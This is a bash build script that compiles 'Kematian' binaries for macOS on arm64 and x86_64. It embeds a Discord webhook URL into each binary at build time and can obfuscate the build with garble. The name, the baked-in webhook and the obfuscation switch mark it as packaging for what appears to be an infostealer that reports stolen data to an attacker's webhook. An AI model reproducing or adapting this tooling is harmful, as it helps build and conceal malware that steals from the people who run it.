#!/usr/bin/env bash
# Build standalone Kematian macOS binaries (CGO required). Run on macOS only.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="${ROOT}/dist"
mkdir -p "${OUT_DIR}"

LDFLAGS="-s -w"
if [[ -n "${DISCORD_WEBHOOK:-}" ]]; then
  # Embed webhook at build time; quotes keep https:// intact in ldflags.
  LDFLAGS="${LDFLAGS} -X 'main.defaultWebhook=${DISCORD_WEBHOOK}'"
fi

BUILD_CMD=(go build -ldflags="${LDFLAGS}")

if [[ "${OBFUSCATE:-false}" == "true" ]]; then
  BUILD_CMD=(garble build -ldflags="${LDFLAGS}")
fi

pushd "${ROOT}" >/dev/null
export CGO_ENABLED=1
export GOOS=darwin

for arch in arm64 amd64; do
  if [[ "${arch}" == "arm64" ]]; then
    export CC="clang -arch arm64"
  else
    export CC="clang -arch x86_64"
  fi
  echo "== Building kematian darwin/${arch} (CGO) =="
  GOARCH="${arch}" "${BUILD_CMD[@]}" \
    -o "${OUT_DIR}/kematian-darwin-${arch}" ./cmd/kematian
done

popd >/dev/null
echo "Done: ${OUT_DIR}/kematian-darwin-{arm64,amd64}"